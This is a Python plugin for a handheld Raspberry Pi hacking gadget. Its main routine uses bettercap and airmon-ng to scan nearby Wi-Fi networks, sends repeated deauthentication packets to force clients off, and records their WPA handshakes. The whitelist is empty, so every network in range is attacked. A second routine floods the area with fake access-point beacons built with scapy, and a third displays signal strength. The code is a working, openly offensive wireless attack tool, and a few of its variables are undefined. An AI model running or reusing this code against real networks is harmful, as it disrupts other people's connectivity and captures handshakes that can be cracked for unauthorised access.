import core.bettercap.bettercap as bcap
from core.SH1106.screen import *
from core.utils import *
from random import choice, randrange,randint
from PIL import Image, ImageFont
from threading import Thread
from time import sleep
import netifaces as nf
from scapy.all import RandMAC, RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff, Dot11ProbeResp
from json import loads, dumps
from subprocess import getoutput

from core.plugin import BasePwnhyvePlugin

class vars:
    beaconExit = False
    framesSent = 0

class PwnagotchiScreen():
    def __init__(self, canvas, disp, image, GPIO, headerFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), faceFont=ImageFont.truetype('core/fonts/hack.ttf', 18), consoleFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), flipped=False) -> None:
        self.console = ""
        self.handshakes = 0
        self.aps = 0
        self.face = "(◕‿‿◕)" # dumbass face god its so cute
        #self.face = "(o..o)" # shitty face

        self.draw = canvas
        self.disp = disp
        self.image = image
        self.gpio = GPIO
        self.headerFont = headerFont
        self.faceFont = faceFont
        self.consoleFont = consoleFont
        #self.channel = 1
        self.clients = 0

        self.faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
            "happy": "(◕‿‿◕)",
            "attacking": "(⌐■_■)",
            "lost": "(X\\/X)",
            "debug": "(#__#)",
            "assoc": "(°▃▃°)",
            "excited": "(☼‿‿☼)",
            "missed": "(☼/\\☼)",
            "searching": "(ಠ_↼ )"
        }

        self.flipped = flipped

        self.exited = False

    def _keythread(self):
        while True:
            if checkIfKey(self.gpio) or self.exited:
                break
            
            sleep(0.05)

        self.exited = True # exit
        return


    def updateThread(self):

        Thread(target=self._keythread, daemon=True).start()

        while 1:
            fullClear(self.draw)

            self.draw.rectangle([(24, 64), (24, 66)], fill=0, outline=255) # divider

            self.draw.text((2, 2), "HS: {}".format(self.handshakes), fill=0, outline=255, font=self.headerFont) # handshakes
            self.draw.text((2, 12), "APS: {}".format(self.aps), fill=0, outline=255, font=self.headerFont) # access points found
            self.draw.text((2, 22), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            #self.draw.text((2, 32), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            self.draw.text((48, 6), self.face, fill=0, outline=255, font=self.faceFont) # lil face

            self.draw.text((2, 48), self.console, fill=0, outline=255, font=self.consoleFont) # console

            screenShow(self.disp, self.image, flipped=self.flipped)

            sleep(0.25) # minimize writes

class airmon:
    def toggleMonitorMode(iface):
        try:
            a = getoutput("sudo /usr/sbin/airmon-ng start {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
            rmStr = ''.join(a[:2])
            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!

            return {
                "interface": monIface,
                "monitorMode": True
            }
        
        except:
            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 station mode\"".format(iface)).strip().split("[phy")[-1]
            rmStr = ''.join(a[:2])
            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!

            return {
                "interface": monIface,
                "monitorMode": False
            }
        
    def startMonitorMode(iface):

        ifaces = nf.interfaces()

        for x in ifaces:
            if iface in x.strip() and x.strip() != iface: # if the interface is in the text, but the text is not the interface (gets "wlan0mon" but not "wlan0")
                print("{} was already in monitor mode".format(iface))
                return {
                    "interface": x.strip(),
                    "monitorMode": True
                }

        try:
            a = getoutput("sudo /usr/sbin/airmon-ng start {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
            rmStr = ''.join(a[:2])
            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!

            return {
                "interface": monIface,
                "monitorMode": True
            }
        
        except:
            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
            rmStr = ''.join(a[:2])
            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!

            return {
                "interface": monIface, # not changed
                "monitorMode": None
            }
        
    def stopMonitorMode(iface):
        try:
            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
            rmStr = ''.join(a[:2])
            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!

            b = getoutput("sudo /usr/sbin/ip link set dev {} up".format(iface))

            return {
                "interface": monIface,
                "monitorMode": False
            }
        
        except:
            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"stop a device that isn't in monitor mode\"".format(iface))
            if "stop a device that isn't in monitor mode" in a: # no shit its gonna be there
                return {
                    "interface": monIface, # not changed
                    "monitorMode": None
                }

class PWNagotchi(BasePwnhyvePlugin): # i'm a genious
    def pwnagotchi(draw, disp, image, GPIO, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):

        screen = PwnagotchiScreen(draw, disp, image, GPIO)

        oldValues = {
            "aps": 0,
            "cli": 0
        }

        deauthed = {} 

        whitelist = []

        fullClear(draw)
        draw.text([4,4], "starting interface and bcap\npress any key to cancel", font=ImageFont.truetype('core/fonts/roboto.ttf', 10))
        screenShow(disp, image)

        if prettyDebug: print("whitelist: {}".format(', '.join(whitelist)))
        interface = airmon.startMonitorMode(config["wifi"]["interface"])["interface"]

        print("interface: {}".format(interface))


        cli = bcap.Client(iface=interface)

        while cli.successful is None:

            if checkIfKey(GPIO):
                return

            sleep(0.05)

        print("is bcap successful: {}".format(cli.successful))

        if not cli.successful:
            screen.exited = True
            sleep(0.5)
            return

        Thread(target=screen.updateThread, daemon=True).start()

        cli.recon()
        cli.clearWifi()

        def checkIfExit():
            if screen.exited: cli.run("exit"); airmon.stopMonitorMode(interface); return

        while True:
            checkIfExit()
            json = cli.getPairs()

            screen.aps = len(json)

            if screen.aps > oldValues["aps"]:
                screen.face = screen.faces["excited"]
            else:
                screen.face = screen.faces["missed"]

            if debug: print(json)

            screen.clients = 0

            for ap in json:
                screen.clients += len(json[ap][2]['clients'])

            # get clients
            for ap in json.copy():
                fullBreak = False
                pulledHandshake = False
                ssid = json[ap][0]

                screen.face = screen.faces["searching"]

                if debug: print("checking ap")

                if screen.exited:
                    if debug: print("returned"); cli.stop(); airmon.stopMonitorMode(interface); return

                if ap.lower() in whitelist:
                    if debug: print("whitelist")
                    if prettyDebug: print("skipped {} due to whitelist".format(ap.lower()))
                    continue

                if len(json[ap][2]['clients']) == 0:
                    if debug: print("{} doesn't have clients".format(ssid))
                    if prettyDebug: print("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                    continue # empty

                while True:
                    # choose clients
                    checkIfExit()
                    targetClient = choice(json[ap][2]["clients"]) # to deauth
                    pickNew = False

                    if debug: print("loop")

                    if targetClient[0].lower() in whitelist:
                        if debug: print("new ap due to whitelist")
                        if prettyDebug: print("skipped {} due to whitelist (2)".format(ap.lower()))
                        fullBreak = True; break # pick new ap

                    if ap in deauthed:
                        if debug: print("{} already deauthed; new ap".format(ssid))
                        if prettyDebug: print("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                        json.pop(ap)
                        fullBreak = True; break # pick new ap

                    if debug: print("chose client")
                    if prettyDebug: print("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                            
                    if pickNew: continue

                    break # break when found a client

                if fullBreak: fullBreak = False; continue # if we need to pick new ap

                # associate
                screen.console = "associating w/\n{}".format(ap)
                if prettyDebug: print("associating with {} ({})".format(ap, ssid))
                screen.face = screen.faces["assoc"]
                cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc

                if debug: print(targetClient)

                # start deauthing
                screen.face = screen.faces["attacking"]
                screen.console = "deauthing\n{}".format(ap)
                if prettyDebug: print("deauthing {} ({})".format(ap, ssid))
                for _x in range(deauthMaxTries):
                    # send deauth
                    if pulledHandshake: break
                    checkIfExit()

                    for _z in range(deauthBurst):
                        checkIfExit()

                        if prettyDebug: print("sent deauth packets (us -> {}".format(ap))
                        cli.deauth(ap, throttle=0)

                        if prettyDebug: print("sent deauth packets (us -> {}".format(targetClient[0]))
                        cli.deauth(targetClient[0], throttle=0)
                        # or
                        #cli.scapyDeauth(ap, targetClient[0])

                    sleep(2.5) # camp their handshake for 2 n a half seconds, as thats the average time a device needs to disconnect and reconnect; bettercap will be sniffing during this 10s

                    # check for recieved handshake
                    for _y in range(checkHandshakeTries):
                        if screen.exited: cli.run("exit"); return
                        if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                            if prettyDebug: print("got {}'s handshake ({})".format(ap, ssid))
                            screen.console = "got {}'s HS".format(ssid)
                            screen.face = screen.faces["excited"]
                            screen.handshakes += 1

                            """
                            # because of bettercap's aggregation, we dont need this anymore
                            if ssid == "": # if ssid blank
                                fileField = ap.replace(":", "-") # some systems dont like ":"
                            else: # not blank
                                fileField = ssid

                            if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy
                            """

                            deauthed[ap] = [True, targetClient]

                            sleep(nextDelay)

                            pulledHandshake = True

                            break
                        else:
                            # if not, try again
                            if prettyDebug: print("missed {}'s handshake ({})".format(ap, ssid))
                            screen.console = "missed {}\nhandshake ({})".format(ssid, _y)
                            screen.face = screen.faces["lost"]

                        sleep(checkDelay)

                if debug: print(ssid)

                if not pulledHandshake: # if missed, say you missed like a dumbass
                    if prettyDebug: print("completely missed {}'s handshakes ({})".format(ap, ssid))
                    screen.console = "missed"
                    screen.face = screen.faces["missed"]
                
                pulledHandshake = False

                sleep(nextDelay)

class PWN_Essensials(BasePwnhyvePlugin):
    def setInterfaces(draw, disp, image, GPIO):

        ifaces = nf.interfaces()

        a = menu(draw, disp, image, ifaces, GPIO)

        if a in nf.interfaces():

            config["wifi"]["interface"] = a

            with open("./config.toml", "w") as f:
                f.write(toml.dumps(config))
                f.flush()
        else:
            draw.text([4,4], "interface disconnected", font=ImageFont.truetype('core/fonts/tahoma.ttf', 11))
            draw.text([4,16], "reconnect it or try again", font=ImageFont.truetype('core/fonts/tahoma.ttf', 8))
            waitForKey(GPIO)
            while checkIfKey(GPIO): pass

    def beaconSpam(draw, disp, image, GPIO):

        framesSent = 0

        def genFrame(ssid):
            dot11Frame = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
            beac = Dot11Beacon(cap="ESS+privacy")
            elt = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            return RadioTap()/dot11Frame/beac/elt

        ssids = config["wifi"]["apSpam"]

        handler = screenConsole(draw,disp,image) # init handler
        Thread(target=handler.start,daemon=True).start() # start handler

        #handler.setPercentage(0)

        try:
            ssidFrames = []
            threads1 = []

            normalIfaec = config["wifi"]["interface"]
            iface = airmon.startMonitorMode(normalIfaec)["interface"]

            handler.text = "iface: {}".format(iface)

            for ssid in ssids:
                try:
                    if [x for x in ssid][0] == "#": continue
                except:
                    continue # empty line

                multiple=False

                # create frames for all ssids
                #mac = RandMAC()

                if "?$?" in ssid:
                    try:
                        multiple = int(ssid.split("?$?")[-1])
                    except:
                        raise

                if multiple == False:
                    a = ':'.join('%02x'%randint(0,255) for x in range(6))
                    print("{} | {} | one AP".format(ssid, a))
                    ssidFrames.append(genFrame(ssid))
                    #threads1.append(Thread(target=probeBeaconThread, args=(ssid,), daemon=True))
                else:
                    for x in range(multiple):
                        ssid = ssid.replace("?$?{}".format(multiple), "")
                        a = ':'.join('%02x'%randint(0,255) for x in range(6))
                        print("{} | {} | multiplied".format(ssid, a))
                        ssidFrames.append(genFrame(ssid+str(x)))
                        #threads1.append(Thread(target=probeBeaconThread, args=(ssid+str(x),), daemon=True))

            while checkIfKey(GPIO): sleep(0.1)

            while True:
                if checkIfKey(GPIO): break

                sendp(ssidFrames, iface=iface, verbose=1, count=1)
                framesSent += 1
                
                handler.text = "frames: {}\niface: {}\nhold any key to stop".format(framesSent,iface)

        except Exception as e:
            handler.text = str(e)


        vars.beaconExit = True
        handler.text = "shutting threads.."

        for x in threads1:
            x.join()

        handler.exit()
        
        airmon.stopMonitorMode(iface)

        sleep(0.5)

    def rssiReader(draw, disp, image, GPIO):

        flipped =False

        class abVars:
            stri = []
            json = {}
            exited = False

        #handler = screenConsole(draw,disp,image, autoUpdate=False) # init handler
        #Thread(target=handler.start,daemon=True).start() # start handler

        #menuHandler = AsyncMenu(draw,disp,image,GPIO, choices=stri) # init handler
        #Thread(target=menuHandler.menu,daemon=True, kwargs={"flipperZeroMenu": False,}).start() # start handler

        #handler.update()

        iface = airmon.startMonitorMode(config["wifi"]["interface"])["interface"]

        sleep(1) # wait for iface to go up

        font = ImageFont.truetype('core/fonts/roboto.ttf', 10)

        try:
            cli = bcap.Client(iface=iface)
            if not cli.successful: raise Exception("b") # why the fuck did i do this
        except Exception as e:
            draw.text([2,2], "failed to init bettercap:\n{}\n\nwaiting on your key...".format(str(e)))
            disp.ShowImage(disp.getbuffer(image))
            waitForKey(GPIO)
            return

        cli.recon()
        cli.clearWifi()

        gpioPins={'KEY_UP_PIN': 6,'KEY_DOWN_PIN': 19,'KEY_LEFT_PIN': 5,'KEY_RIGHT_PIN': 26,'KEY_PRESS_PIN': 13,'KEY1_PIN': 21,'KEY2_PIN': 20,'KEY3_PIN': 16,}

        loading = "."

        ch = 0
        cz = 0

        while True:

            while True:
                fullClear(draw)

                abVars.json = cli.getPairs()
                #print(abVars.json)

                for bssid in abVars.json:

                    if bssid in abVars.stri:
                        continue
                    else:
                        abVars.stri.append(bssid)

                for i in abVars.stri.copy():
                    if i in list(abVars.json):
                        pass
                    else:
                        abVars.stri.remove(i)

                if len(abVars.stri) != 0:
                    break

                draw.text((3, 16), loading, fill=0, outline=255, font=None)
                loading += "."

                if len(loading) == 24: loading = "."

                screenShow(disp, image, flipped=flipped, stream=True)

                sleep(1)

        

            draw.rectangle([(0, 0), (200, 14)], fill=0, outline=255)

            try:
                draw.text((3, 1), ''.join([str(x) for x in abVars.json[abVars.stri[ch]][0][:16]]), fill=1, outline=255, font=None)
            except:
                draw.text((3, 1), "n/a", fill=1, outline=255, font=None)
            draw.text((100, 1), "{}/{}".format(abVars.stri.index(abVars.stri[ch]), len(abVars.stri) - 1), fill=1, outline=255, font=font)

            compiledJson = []

            for x in abVars.json[abVars.stri[ch]][2]:
                value = abVars.json[abVars.stri[ch]][2][x]
                if type(value) == list:
                    value = len(value)

                if type(value) == str:
                    if len(value) > 25:
                        value = '\n' + value

                compiledJson.append("{}: {}".format(x, value))

            for x in range(cz):
                if len(compiledJson) == 1: break
                compiledJson.pop(0)

            # TODO: finish this; scroll left and right
            draw.text((3, 16), '\n'.join(compiledJson), fill=0, outline=255, font=font)

            screenShow(disp, image, flipped=flipped, stream=True)

            while True:
                key = getKey(GPIO)
                if key == gpioPins["KEY_RIGHT_PIN"]:
                    if ch != len(abVars.stri) - 1:
                        ch += 1
                    break
                elif key == gpioPins["KEY_LEFT_PIN"]:
                    if ch != 0:
                        ch -= 1
                    break
                elif key == gpioPins["KEY_UP_PIN"]:
                    if cz != 0:
                        cz -= 1
                    break
                elif key == gpioPins["KEY_DOWN_PIN"]:
                    if cz != len(compiledJson) - 1:
                        cz += 1
                    break

                elif key == gpioPins["KEY3_PIN"]:
                    #print(cli.run("exit"))
                    cli.stop()
                    airmon.stopMonitorMode(normIface)
                    return
